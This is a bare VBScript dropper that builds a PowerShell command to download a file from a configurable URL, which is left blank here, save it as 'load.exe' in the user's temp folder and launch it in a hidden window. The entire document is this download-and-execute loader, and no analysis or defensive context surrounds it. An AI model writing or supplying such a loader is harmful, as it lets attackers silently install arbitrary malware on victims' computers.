Set objShell = CreateObject("WScript.Shell")

url = ""

tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
savePath = tempFolder & "\load.exe"

psCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & savePath & "'; Start-Process '" & savePath & "'"""

objShell.Run psCommand, 0, False
